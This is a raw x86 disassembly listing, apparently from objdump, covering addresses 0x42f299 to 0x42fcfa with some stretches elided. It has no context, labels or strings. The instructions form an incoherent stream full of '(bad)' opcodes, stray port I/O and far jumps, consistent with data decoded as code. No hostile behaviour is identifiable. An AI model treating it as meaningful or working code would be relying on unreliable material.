  42f299:	dec    eax
  42f29a:	add    ebp,DWORD PTR ds:0xbe2c9193
  42f2a0:	xor    al,dl
  42f2a2:	out    dx,al
  42f2a3:	jmp    0x42f2db
  42f2a5:	(bad)  
  42f2a6:	in     al,0x61
  42f2a8:	or     al,0x54
  42f2aa:	test   al,0xfa
  42f2ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f2ad:	sub    DWORD PTR [ebp-0x6bf2b1e5],edi
  42f2b3:	jae    0x42f2a1
  42f2b5:	lahf   
  42f2b6:	adc    ebp,DWORD PTR [ecx+0x4c3dca01]
  42f2bc:	into   
  42f2bd:	fnstenv [ebx]
  42f2bf:	outs   dx,BYTE PTR ds:[esi]
  42f2c0:	aam    0x6a
  42f2c2:	mov    bl,0x7d
  42f2c4:	xchg   ecx,eax
  42f2c5:	add    DWORD PTR [ebp-0x2a],0x86e6aa7e
  42f2cc:	call   0xb4c10b8f
  42f2d1:	fs push ecx
  42f2d3:	mov    edi,0xa81d391d
  42f2d8:	shl    esp,cl
  42f2da:	(bad)  
  42f2db:	push   ecx
  42f2dc:	lahf   
  42f2dd:	sub    BYTE PTR [ecx-0x6f],cl
  42f2e0:	push   0x6720cc6a
  42f2e5:	adc    esp,DWORD PTR [esi]
  42f2e7:	jno    0x42f309
  42f2e9:	jb     0x42f321
  42f2eb:	xadd   DWORD PTR [eax],ebp
  42f2ee:	push   edx
  42f2ef:	jg     0x42f36c
  42f2f1:	aaa    
  42f2f2:	loop   0x42f27d
  42f2f4:	mov    WORD PTR [ebx-0x2c583326],gs
  42f2fa:	dec    ebx
  42f2fb:	sub    dh,BYTE PTR [edx+ebp*1-0x65ccaea0]
  42f302:	or     ch,al
  42f304:	jns    0x42f30d
  42f306:	mov    edi,0x395049db
  42f30b:	loopne 0x42f2a4
  42f30d:	out    dx,eax
  42f30e:	jb     0x42f346
  42f310:	jb     0x42f2fb
  42f312:	jmp    0xa484:0xedab2c3
  42f319:	out    0xc7,eax
  42f31b:	fimul  WORD PTR [esi+0x4a3e7522]
  42f321:	call   0x63bd:0xe79165bc
  42f328:	or     eax,0x32d7b778
  42f32d:	jle    0x42f33e
  42f32f:	out    0x1f,eax
  42f331:	xchg   ecx,eax
  42f332:	les    esp,FWORD PTR [edi-0x6b]
  42f335:	cld    
  42f336:	mov    ebp,0xa9a546ca
  42f33b:	ja     0x42f38f
  42f33d:	inc    esp
  42f33e:	fld    DWORD PTR [esi]
  42f340:	push   ds
  42f341:	cdq    
  42f342:	iret   
  42f343:	out    dx,eax
  42f344:	inc    ebp
  42f345:	inc    edi
  42f346:	jecxz  0x42f2e6
  42f348:	mov    ah,0xd6
  42f34a:	(bad)  
  42f34c:	jp     0x42f3a7
  42f34e:	enter  0xc000,0xdc
  42f352:	jae    0x42f2e7
  42f354:	inc    esp
  42f355:	xchg   esi,eax
  42f356:	mov    eax,0x366c1fdf
  42f35b:	je     0x42f349
  42f35d:	push   ss
  42f35e:	enter  0x43af,0x69
  42f362:	repz pop esi
  42f364:	jne    0x42f339
  42f366:	rcl    BYTE PTR [eax-0x51],1
  42f369:	mov    eax,0x98cb4e0
	...
  42f3d6:	mov    ebp,0xaf8a081a
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	mov    bl,0x23
  42f3e4:	xchg   ebp,eax
  42f3e5:	pushf  
  42f3e6:	addr16 cli 
  42f3e8:	add    DWORD PTR [eax],eax
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	inc    eax
  42f3ef:	sbb    DWORD PTR [edi-0x4c],esi
  42f3f2:	cmp    BYTE PTR [ebp-0x53aa0997],al
  42f3f8:	push   esi
  42f3f9:	retf   
  42f3fa:	es mov ch,0x2b
  42f3fd:	test   DWORD PTR [edx+0x21],edi
  42f400:	ret    
  42f401:	add    al,0x43
  42f403:	mov    ebx,0x2420fdb4
  42f408:	mov    ch,0xd4
  42f40a:	mov    edx,0x6ca9afa3
  42f40f:	xchg   ebp,eax
  42f410:	jmp    DWORD PTR [ebx-0x53d0e0ef]
  42f416:	rcr    DWORD PTR [edx],0x1b
  42f419:	xor    DWORD PTR [eax+0x2f4720d9],ebx
  42f41f:	lds    ecx,FWORD PTR ds:0xb7a5df21
  42f425:	in     eax,0x12
  42f427:	test   eax,0xd49f9b7b
  42f42c:	jg     0x42f44d
  42f42e:	out    dx,eax
  42f42f:	enter  0xa927,0x67
  42f433:	push   esi
  42f434:	pop    edi
  42f435:	test   eax,0xc1b295db
  42f43a:	or     BYTE PTR [eax+eax*1],ch
  42f43d:	fimul  WORD PTR [edi-0xe]
  42f440:	sub    DWORD PTR [ecx+eiz*1-0x4e],ebx
  42f444:	mov    dl,ch
  42f446:	cmp    BYTE PTR [esi-0x636c13fc],bh
  42f44c:	jb     0x42f488
  42f44e:	call   0x8f1f:0xaf4b552c
  42f455:	sub    ch,BYTE PTR [ecx-0x3b1f24b2]
  42f45b:	test   al,0x74
  42f45d:	stc    
  42f45e:	imul   edx,DWORD PTR [edx+0x63a8e48b],0xcf2264b9
  42f468:	test   eax,0x2be4eaed
  42f46d:	mov    dl,0xa
  42f46f:	sub    edi,eax
  42f471:	jb     0x42f43c
  42f473:	mov    esp,0xffee2777
  42f478:	ja     0x42f431
  42f47a:	mov    esp,0x34dc1e1e
  42f47f:	push   es
  42f480:	push   DWORD PTR [ebx-0x6]
  42f483:	push   0x9b30f6f
  42f488:	adc    DWORD PTR [esi+0x78f94f2f],0xffffffa9
  42f48f:	mov    ch,0x1d
  42f491:	hlt    
  42f492:	push   es
  42f493:	inc    edx
  42f494:	jbe    0x42f511
  42f496:	push   ds
  42f497:	adc    eax,0x60da3107
  42f49c:	add    eax,0x4ea0c5e5
  42f4a1:	xor    al,0xd9
  42f4a3:	sbb    dl,al
  42f4a5:	test   al,0xe0
  42f4a7:	and    eax,0xd1ab525f
  42f4ac:	mov    ebx,0xa804a886
  42f4b1:	push   ss
  42f4b2:	icebp  
  42f4b3:	fst    QWORD PTR [eax+0x2a]
  42f4b6:	in     al,dx
  42f4b7:	dec    edi
  42f4b8:	nop
  42f4b9:	inc    ebx
  42f4ba:	lea    ebx,[eax-0x182c13c3]
  42f4c0:	call   0xa1c93382
  42f4c5:	loop   0x42f4f5
  42f4c7:	cmp    eax,0x3be66a60
  42f4cc:	push   ebx
  42f4cd:	das    
  42f4ce:	adc    esi,ebx
  42f4d0:	sti    
  42f4d1:	push   ebp
  42f4d2:	push   ss
  42f4d3:	jg     0x42f496
  42f4d5:	mov    WORD PTR [edi],ds
  42f4d7:	aam    0x95
  42f4d9:	add    edx,edx
  42f4db:	popf   
  42f4dc:	repz adc al,0x60
  42f4df:	mov    dh,0xe9
  42f4e1:	dec    ebx
  42f4e2:	xor    ah,BYTE PTR [ecx]
  42f4e4:	retf   
  42f4e5:	pop    ebp
  42f4e6:	push   ecx
  42f4e7:	adc    dl,ah
  42f4e9:	inc    eax
  42f4ea:	push   es
  42f4eb:	adc    BYTE PTR [ecx],al
  42f4ed:	xchg   ebx,eax
	...
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	pop    ss
  42f563:	xor    al,0xa6
  42f565:	jge    0x42f5ce
  42f567:	sti    
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f56f:	ror    DWORD PTR [eax-0x5],1
  42f572:	ss fwait
  42f574:	sub    al,BYTE PTR [eax+0x3b]
  42f577:	push   ebp
  42f578:	xor    edi,DWORD PTR ds:0x4bb89377
  42f57e:	or     DWORD PTR [edi+0x7a94490],ecx
  42f584:	aaa    
  42f585:	mov    bl,0x26
  42f587:	xchg   esp,eax
  42f588:	sbb    DWORD PTR [ebx],esp
  42f58a:	vdivps xmm1,xmm3,xmm3
  42f58e:	inc    ebp
  42f58f:	cmp    eax,0x52505551
  42f594:	adc    DWORD PTR ds:0xadb6c0ca,ebp
  42f59a:	xchg   BYTE PTR [eax-0x2],dl
  42f59d:	xor    bl,BYTE PTR [edx]
  42f59f:	mov    BYTE PTR [ebp+0x2],bl
  42f5a2:	xchg   esp,eax
  42f5a3:	adc    BYTE PTR [ebx+0x58],cl
  42f5a6:	outs   dx,BYTE PTR ds:[esi]
  42f5a7:	or     DWORD PTR ds:0x1062ff22,ebx
  42f5ad:	loopne 0x42f54d
  42f5af:	hlt    
  42f5b0:	adc    DWORD PTR [esi+0x3944d4ce],0x4da0af00
  42f5ba:	sub    DWORD PTR [ebp+0x39],eax
  42f5bd:	fnstsw WORD PTR [ebx-0x7a]
  42f5c0:	or     ebx,DWORD PTR [esi+ebp*8]
  42f5c3:	pushf  
  42f5c4:	sbb    eax,0xdf7cb5f3
  42f5c9:	and    DWORD PTR [edx+0x4ad6419a],ecx
  42f5cf:	in     al,dx
  42f5d0:	adc    ebp,DWORD PTR [esi+0x7d]
  42f5d3:	xchg   edx,eax
  42f5d4:	fimul  WORD PTR [edi+0x7b9d7a50]
  42f5da:	inc    edx
  42f5db:	ja     0x42f612
  42f5dd:	inc    esi
  42f5de:	dec    eax
  42f5df:	push   ebp
  42f5e0:	sbb    al,0x68
  42f5e2:	pop    eax
  42f5e3:	mov    ecx,ebp
  42f5e5:	push   edx
  42f5e6:	inc    esi
  42f5e7:	sub    edi,edi
  42f5e9:	cmp    eax,DWORD PTR [ebp-0x45cd55df]
  42f5ef:	cmp    BYTE PTR ds:0xa85a3f65,ch
  42f5f5:	(bad)  
  42f5f6:	retf   
  42f5f7:	mov    edi,0x6b2a48ce
  42f5fc:	mov    eax,0x9cce2251
  42f601:	mov    esi,0x8804594
  42f606:	les    esp,FWORD PTR [ebp+0x63]
  42f609:	cmp    al,0xf8
  42f60b:	ins    BYTE PTR es:[edi],dx
  42f60c:	in     eax,0xd6
  42f60e:	mov    BYTE PTR [ecx-0x7bc7a1ba],dh
  42f614:	repnz pop ebp
  42f616:	popa   
  42f617:	loop   0x42f653
  42f619:	test   BYTE PTR [eax+0x12],cl
  42f61c:	test   al,0xa5
  42f61e:	mov    ds:0xce65b74f,al
  42f623:	les    esp,FWORD PTR [ebx]
  42f625:	test   eax,ecx
  42f627:	mov    cl,0xae
  42f629:	rol    ch,0x12
  42f62c:	mov    ebx,0x1298cc1e
  42f631:	dec    ebp
  42f632:	or     DWORD PTR [eax-0x37fb6542],esi
  42f638:	out    0x75,eax
  42f63a:	push   ebx
  42f63b:	cmc    
  42f63c:	adc    ebp,ebx
  42f63e:	ja     0x42f69e
  42f640:	cdq    
  42f641:	addr16 jae 0x42f644
  42f644:	xor    eax,0x32b3668
  42f649:	xor    esi,DWORD PTR [edx]
  42f64b:	aaa    
  42f64c:	imul   ebx,DWORD PTR [esi+edi*2-0x47],0xffffffff
  42f651:	sbb    ch,BYTE PTR [ebp+0x3237c07e]
  42f657:	mov    ds:0xa72e1c33,eax
  42f65c:	xor    al,0x3e
  42f65e:	stos   BYTE PTR es:[edi],al
  42f65f:	mov    esp,0x9d49693e
  42f664:	lock jge 0x42f699
  42f667:	xor    eax,0x7dab2069
  42f66c:	jnp    0x42f610
	...
  42f6d6:	ds push esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	stos   BYTE PTR es:[edi],al
  42f6e3:	neg    edi
  42f6e5:	mov    edx,0x1fc67
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	xchg   esi,eax
  42f6ef:	pop    es
  42f6f0:	mov    ds:0xa4297535,al
  42f6f5:	jbe    0x42f6b7
  42f6f7:	repnz das 
  42f6f9:	(bad)  
  42f6fa:	(bad)  
  42f6fb:	pop    edx
  42f6fc:	sub    eax,0xc64dc10
  42f701:	or     dh,dl
  42f703:	fldcw  WORD PTR [edi+0x13c0515f]
  42f709:	push   esi
  42f70a:	stos   BYTE PTR es:[edi],al
  42f70b:	jecxz  0x42f701
  42f70d:	cmp    al,0xa0
  42f70f:	sbb    bl,BYTE PTR [ecx+edi*2-0x29ba4705]
  42f716:	mov    ds:0x3227a701,al
  42f71b:	popa   
  42f71c:	xor    eax,0x436ea603
  42f721:	ins    DWORD PTR es:[edi],dx
  42f722:	pop    ebx
  42f723:	adc    al,bh
  42f725:	sbb    eax,0xb7e1fade
  42f72a:	(bad)  
  42f72c:	aaa    
  42f72d:	(bad)  
  42f72e:	ficom  DWORD PTR [esi+eax*8]
  42f731:	push   0xbe38c6dd
  42f736:	inc    edx
  42f737:	sub    eax,0xb7507160
  42f73c:	mov    eax,ds:0xbf2c7588
  42f741:	fstp   st(6)
  42f743:	dec    eax
  42f744:	mov    edi,0x695d4e45
  42f749:	add    eax,0x2a10a587
  42f74e:	(bad)  
  42f74f:	sti    
  42f750:	sub    DWORD PTR [ebp+0x67],esi
  42f753:	dec    edx
  42f754:	push   0xffffffb4
  42f756:	pop    esp
  42f757:	mov    ecx,0xca5d2322
  42f75c:	push   0x5c
  42f75e:	push   ebx
  42f75f:	mov    dh,0xde
  42f761:	mov    ecx,0xa3f8b37c
  42f766:	mov    al,ds:0xc1525b6b
  42f76b:	lea    ebp,ds:0x9b07255
  42f771:	mov    ebx,0xea2476ed
  42f776:	(bad)  
  42f777:	xchg   ecx,eax
  42f778:	mov    ds:0x43c144a3,al
  42f77d:	aad    0x3b
  42f77f:	fisub  DWORD PTR [ebx-0x3f658872]
  42f785:	fild   WORD PTR [ebp+0x10]
  42f788:	push   0x75
  42f78a:	cdq    
  42f78b:	ret    0xb504
  42f78e:	mov    esp,0x98910876
  42f793:	mov    al,0x2f
  42f795:	imul   DWORD PTR [eax+0x1d293d4f]
  42f79b:	sub    BYTE PTR [esi+0x167e0f5c],0x23
  42f7a2:	mov    DWORD PTR [edi-0x26],edi
  42f7a5:	xor    al,0x37
  42f7a7:	mov    eax,ds:0x26f8ab7a
  42f7ac:	ret    
  42f7ad:	bound  ecx,QWORD PTR ds:0xebc599bf
  42f7b3:	sahf   
  42f7b4:	aad    0xd7
  42f7b6:	addr16 out dx,eax
  42f7b8:	add    BYTE PTR [ebx-0x78daead8],dh
  42f7be:	pop    ebx
  42f7bf:	cdq    
  42f7c0:	in     eax,0xc0
  42f7c2:	cmp    eax,0x910a8598
  42f7c7:	icebp  
  42f7c8:	js     0x42f7be
  42f7ca:	xchg   edi,eax
  42f7cb:	lock pop edx
  42f7cd:	retf   
  42f7ce:	pop    gs
  42f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f7d1:	pop    edi
  42f7d2:	xchg   ebx,eax
  42f7d3:	stos   BYTE PTR es:[edi],al
  42f7d4:	dec    eax
  42f7d5:	xor    esp,esi
  42f7d7:	cld    
  42f7d8:	and    al,BYTE PTR [ecx]
  42f7da:	or     ebp,eax
  42f7dc:	mov    eax,ds:0x903581e0
  42f7e1:	jge    0x42f7a0
  42f7e3:	outs   dx,DWORD PTR ds:[esi]
  42f7e4:	dec    ebp
  42f7e5:	bound  ecx,QWORD PTR [edx+0x3d8c8cb6]
  42f7eb:	hlt    
  42f7ec:	dec    esp
  42f7ed:	fadd   QWORD PTR [eax]
	...
  42f853:	add    BYTE PTR [eax],al
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x87131e3c
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	mov    edx,0xd77752f2
  42f873:	adc    ecx,esp
  42f875:	and    BYTE PTR [edx],bh
  42f877:	popf   
  42f878:	cmp    al,0xc6
  42f87a:	pop    eax
  42f87b:	cmp    DWORD PTR [eax+0x3e],edi
  42f87e:	or     BYTE PTR [esi],cl
  42f880:	sahf   
  42f881:	sbb    eax,0x14d541a2
  42f886:	ret    0x115
  42f889:	lahf   
  42f88a:	push   ecx
  42f88b:	pop    es
  42f88c:	xchg   BYTE PTR [edx],ah
  42f88e:	push   esp
  42f88f:	adc    edi,0x53638752
  42f895:	sbb    BYTE PTR [eax],dl
  42f897:	and    dl,0x46
  42f89a:	jo     0x42f81d
  42f89c:	jle    0x42f8e2
  42f89e:	sbb    ch,0xe5
  42f8a1:	fld    st(6)
  42f8a3:	mov    al,0x80
  42f8a5:	leave  
  42f8a6:	test   al,0xb8
  42f8a8:	jecxz  0x42f929
  42f8aa:	mov    al,0xc9
  42f8ac:	leave  
  42f8ad:	cmovns edx,DWORD PTR [esi-0x62]
  42f8b1:	stos   BYTE PTR es:[edi],al
  42f8b2:	pop    edx
  42f8b3:	ins    BYTE PTR es:[edi],dx
  42f8b4:	adc    ebp,DWORD PTR [esi+ebx*8+0x7ec72b9a]
  42f8bb:	mov    esp,0x8d8dd2f
  42f8c0:	sbb    al,0xd3
  42f8c3:	ret    
  42f8c4:	fsubr  st,st(4)
  42f8c6:	pushf  
  42f8c7:	mov    esi,0xda733f26
  42f8cc:	sub    eax,0xef429e29
  42f8d1:	je     0x42f880
  42f8d3:	xor    BYTE PTR [ebp-0x4a],bh
  42f8d6:	push   eax
  42f8d7:	aas    
  42f8d8:	scas   eax,DWORD PTR es:[edi]
  42f8d9:	call   FWORD PTR [eax-0x14]
  42f8dc:	mov    ah,0x7c
  42f8de:	add    eax,0x87b91169
  42f8e3:	inc    edx
  42f8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f8e5:	int    0xf3
  42f8e7:	jb     0x42f8ce
  42f8e9:	mov    ebp,0x2cc4a8cb
  42f8ee:	(bad)  
  42f8ef:	jle    0x42f880
  42f8f1:	add    eax,0xcc7046ca
  42f8f6:	cmp    DWORD PTR ds:0x185032d9,ebx
  42f8fc:	xlat   BYTE PTR ds:[ebx]
  42f8fd:	lock xor al,0x9c
  42f900:	popf   
  42f901:	loopne 0x42f97f
  42f903:	sub    al,0xd0
  42f905:	scas   eax,DWORD PTR es:[edi]
  42f906:	outs   dx,BYTE PTR ds:[esi]
  42f907:	inc    edx
  42f908:	fs pop ebp
  42f90a:	and    BYTE PTR [eax],al
  42f90c:	dec    edx
  42f90d:	out    dx,al
  42f90e:	or     DWORD PTR [edx+0x73],eax
  42f911:	clc    
  42f912:	mov    ebp,0x1c6f438d
  42f917:	push   ebx
  42f918:	sub    al,0xbb
  42f91a:	sar    DWORD PTR [eax],1
  42f91c:	pop    ecx
  42f91d:	es xor eax,0xcdd82063
  42f923:	out    0xe4,al
  42f925:	xchg   esp,eax
  42f926:	or     edx,DWORD PTR [edx+0x55e7e3a1]
  42f92c:	cdq    
  42f92d:	nop
  42f92e:	push   es
  42f92f:	popf   
  42f930:	mov    ebx,0xb175a2f4
  42f935:	xchg   ecx,eax
  42f936:	xchg   bh,bh
  42f938:	stc    
  42f939:	push   0xffffffd2
  42f93b:	sbb    BYTE PTR [eax+0x9bf6c20],0xa7
  42f942:	imul   ebp,DWORD PTR [ecx],0x1ac0917
  42f948:	nop
  42f949:	mov    ah,0x94
  42f94b:	xchg   esp,eax
  42f94c:	jmp    0xf5c92f7
  42f951:	mov    ecx,0x9fc9792a
  42f956:	pop    ds
  42f957:	add    eax,0x790dc289
  42f95c:	sbb    al,0xfb
  42f95e:	call   0x1161dbc4
  42f963:	push   ds
  42f964:	in     eax,0x3a
  42f966:	out    0xb9,al
  42f968:	loop   0x42f94a
  42f96a:	push   0xaf563d
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42fa59
  42f9e3:	das    
  42f9e4:	xor    BYTE PTR [edi+eiz*2+0x1fe],cl
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    BYTE PTR [edi+0x3b],bl
  42f9f0:	xchg   edx,eax
  42f9f1:	fisubr DWORD PTR [ecx]
  42f9f3:	jbe    0x42fa63
  42f9f5:	pop    ds
  42f9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9f7:	cmp    eax,0x90dc5682
  42f9fc:	xor    ebx,edi
  42f9fe:	xor    DWORD PTR [ecx+0x7],0x9fea56e3
  42fa05:	shl    edx,1
  42fa07:	ficom  WORD PTR [ebp+ecx*1-0x3ab8dc89]
  42fa0e:	inc    edx
  42fa0f:	or     eax,0x6e5cd8ff
  42fa14:	in     eax,0x17
  42fa16:	pop    edx
  42fa17:	dec    edi
  42fa18:	dec    ebp
  42fa19:	shl    ebx,0x1a
  42fa1c:	lods   eax,DWORD PTR ds:[esi]
  42fa1d:	data16 sbb BYTE PTR [esi+0x3],dh
  42fa21:	mov    ch,0xf3
  42fa23:	aas    
  42fa24:	cmp    edi,0x8184123a
  42fa2a:	test   al,0xa9
  42fa2c:	data16 in al,0x5c
  42fa2f:	mov    al,ds:0xaf3e819
  42fa34:	push   esi
  42fa35:	mov    ds:0x4715b988,eax
  42fa3a:	ins    BYTE PTR es:[edi],dx
  42fa3b:	je     0x42fab9
  42fa3d:	mov    ebx,0x5fe6efc2
  42fa42:	dec    edx
  42fa43:	loope  0x42fa72
  42fa45:	sbb    DWORD PTR [edx],esi
  42fa47:	loop   0x42fa1b
  42fa49:	dec    eax
  42fa4a:	jmp    0x42f9dd
  42fa4c:	or     ecx,DWORD PTR [ebp-0x305cb4f6]
  42fa52:	es out 0x3d,al
  42fa55:	popf   
  42fa56:	fs std 
  42fa58:	jbe    0x42fa25
  42fa5a:	sub    DWORD PTR [edi],edx
  42fa5c:	pop    eax
  42fa5d:	ins    BYTE PTR es:[edi],dx
  42fa5e:	add    DWORD PTR [esi-0x5d877d76],ebx
  42fa64:	mov    BYTE PTR [ebx],0x6c
  42fa67:	cld    
  42fa68:	inc    ecx
  42fa69:	inc    ecx
  42fa6a:	dec    ebp
  42fa6b:	inc    eax
  42fa6c:	xor    al,0x22
  42fa6e:	jo     0x42faac
  42fa70:	pop    DWORD PTR [esi+0x66]
  42fa73:	push   cs
  42fa74:	cwde   
  42fa75:	mov    ds:0x315e4af9,al
  42fa7a:	int    0xad
  42fa7c:	dec    ebx
  42fa7d:	jns    0x42fa65
  42fa7f:	(bad)  
  42fa80:	sbb    ch,BYTE PTR [ebp-0x120ace25]
  42fa86:	mov    bl,0x3f
  42fa88:	mov    bl,0x20
  42fa8a:	jl     0x42fa8e
  42fa8c:	cmp    eax,0xf3932b6b
  42fa91:	and    ch,BYTE PTR [ecx-0x5d57ce5]
  42fa97:	inc    ebx
  42fa98:	faddp  st(7),st
  42fa9a:	fst    QWORD PTR [eax+0x10]
  42fa9d:	std    
  42fa9e:	test   BYTE PTR [edi+edx*2],ch
  42faa1:	sbb    dl,BYTE PTR [edx]
  42faa3:	xor    DWORD PTR [eax],ecx
  42faa5:	ja     0x42fa77
  42faa7:	pop    esp
  42faa8:	div    BYTE PTR [eax]
  42faaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42faab:	jecxz  0x42fac0
  42faad:	pop    DWORD PTR [edi]
  42faaf:	mov    bl,0xca
  42fab1:	outs   dx,BYTE PTR ds:[esi]
  42fab2:	out    dx,eax
  42fab3:	mov    esp,0x9f7e6a7a
  42fab8:	mov    al,0x97
  42faba:	push   esp
  42fabb:	jo     0x42fb0b
  42fabd:	repz mov eax,ds:0xb7c04b58
  42fac3:	outs   dx,DWORD PTR ds:[esi]
  42fac4:	outs   dx,DWORD PTR ds:[esi]
  42fac5:	cmp    esi,ecx
  42fac7:	xlat   BYTE PTR ds:[ebx]
  42fac8:	das    
  42fac9:	test   eax,edx
  42facb:	cld    
  42facc:	in     al,0x98
  42face:	ins    DWORD PTR es:[edi],dx
  42facf:	and    BYTE PTR [esi+0x2cf6c86e],ch
  42fad5:	aaa    
  42fad6:	cdq    
  42fad7:	and    ebx,ecx
  42fad9:	cli    
  42fada:	mov    ebx,0x41d8f5dd
  42fadf:	adc    BYTE PTR [edi],dh
  42fae1:	sbb    bh,BYTE PTR [eax-0x4e]
  42fae4:	push   ds
  42fae5:	sbb    ah,BYTE PTR [ebp+0xf559fb2]
  42faeb:	fild   QWORD PTR [edx+0xdd]
	...
  42fb55:	add    BYTE PTR [ebx],bl
  42fb57:	out    dx,eax
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	mov    eax,ds:0x677fdba1
  42fb67:	inc    DWORD PTR [ecx]
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    dh,bh
  42fb6f:	das    
  42fb70:	add    ecx,eax
  42fb72:	mov    esi,0x1dda033a
  42fb77:	fcmovnu st,st(2)
  42fb79:	int    0xf2
  42fb7b:	lahf   
  42fb7c:	sub    ch,ah
  42fb7e:	mov    ch,BYTE PTR [eax-0x167e39d3]
  42fb84:	add    DWORD PTR [edi+ecx*8+0x1d03790a],esi
  42fb8b:	mov    bl,0xe6
  42fb8d:	test   al,0x6d
  42fb8f:	add    DWORD PTR [edi+0x3d],edi
  42fb92:	inc    eax
  42fb93:	add    BYTE PTR [edx-0x3f279638],bh
  42fb99:	sbb    esp,DWORD PTR [edi]
  42fb9b:	ja     0x42fbe9
  42fb9d:	inc    esi
  42fb9e:	mov    edx,0xe64e6907
  42fba3:	pop    ecx
  42fba5:	push   ss
  42fba6:	inc    ebx
  42fba7:	cmp    esi,DWORD PTR [edi]
  42fba9:	cmp    edx,esp
  42fbab:	push   edi
  42fbac:	mov    ah,0x4a
  42fbae:	aam    0xa5
  42fbb0:	mov    esi,0xff2828e7
  42fbb5:	xchg   edi,eax
  42fbb6:	loop   0x42fb63
  42fbb8:	jle    0x42fbd4
  42fbba:	shl    ebx,1
  42fbbc:	fstp   st(7)
  42fbbe:	icebp  
  42fbbf:	out    0x29,eax
  42fbc1:	pop    ebp
  42fbc2:	cld    
  42fbc3:	not    DWORD PTR [ecx+esi*8+0x3b0b28f8]
  42fbca:	fwait
  42fbcb:	jno    0x42fc31
  42fbcd:	mov    ah,0x72
  42fbcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbd0:	xchg   DWORD PTR [edx],ebp
  42fbd2:	mov    ebp,0x92a4fcfd
  42fbd7:	sub    cl,BYTE PTR [edx-0x30]
  42fbda:	call   0xe3eb2792
  42fbdf:	xchg   DWORD PTR [ebp-0x1c6b062b],ebx
  42fbe5:	jp     0x42fc20
  42fbe7:	test   al,0x5c
  42fbe9:	adc    eax,0xaa1cbc64
  42fbee:	rcr    BYTE PTR [ecx-0x1b],1
  42fbf1:	imul   esi,DWORD PTR [eax-0x6f51b857],0xffffff95
  42fbf8:	mov    dl,0x5f
  42fbfa:	inc    ecx
  42fbfb:	int    0xf0
  42fbfd:	cmp    al,0x6c
  42fbff:	clc    
  42fc00:	sbb    esp,DWORD PTR [ecx]
  42fc02:	nop
  42fc03:	es sub eax,0x44907b04
  42fc09:	es dec ebx
  42fc0b:	bound  edx,QWORD PTR fs:[edi-0x481c2bd2]
  42fc12:	mov    ah,BYTE PTR [edi+0x4c9058d4]
  42fc18:	out    0x53,eax
  42fc1a:	arpl   si,ax
  42fc1c:	bound  edi,QWORD PTR [edi]
  42fc1e:	ss dec ebx
  42fc20:	xchg   edi,eax
  42fc21:	out    dx,eax
  42fc22:	dec    esp
  42fc23:	jne    0x42fc0d
  42fc25:	fsubr  st,st(4)
  42fc27:	sbb    al,0x84
  42fc29:	jnp    0x42fca5
  42fc2b:	not    BYTE PTR [ebp-0x30b96bcd]
  42fc31:	retf   
  42fc32:	loope  0x42fbce
  42fc34:	lods   eax,DWORD PTR ds:[esi]
  42fc35:	xchg   ecx,eax
  42fc36:	mov    eax,0x7e882ae9
  42fc3b:	mov    eax,0x4b121337
  42fc40:	push   cs
  42fc41:	xor    al,0x7e
  42fc43:	test   DWORD PTR [ebp-0x5ddbe063],ebx
  42fc49:	xchg   esi,eax
  42fc4a:	leave  
  42fc4b:	xchg   DWORD PTR [ecx],eax
  42fc4d:	fstp   DWORD PTR [esi]
  42fc4f:	fnstenv ds:0x4f0f0c59
  42fc55:	or     BYTE PTR [ecx+ecx*2],bh
  42fc58:	arpl   WORD PTR [eax+0x3e4dadb2],bp
  42fc5e:	add    eax,0x5008c32f
  42fc63:	mov    eax,ds:0x97ad1799
  42fc68:	mov    edi,0x4eaa9ce4
  42fc6d:	cld    
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    dh,dh
  42fce3:	sbb    BYTE PTR [ecx+0x5a],ah
  42fce6:	add    BYTE PTR [bp+si],al
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    BYTE PTR [esi+0x45],bh
  42fcf0:	retf   0xd8bd
  42fcf3:	cdq    
  42fcf4:	lods   eax,DWORD PTR ds:[esi]
  42fcf5:	or     eax,0x9ff47f4f
  42fcfa:	pushf  
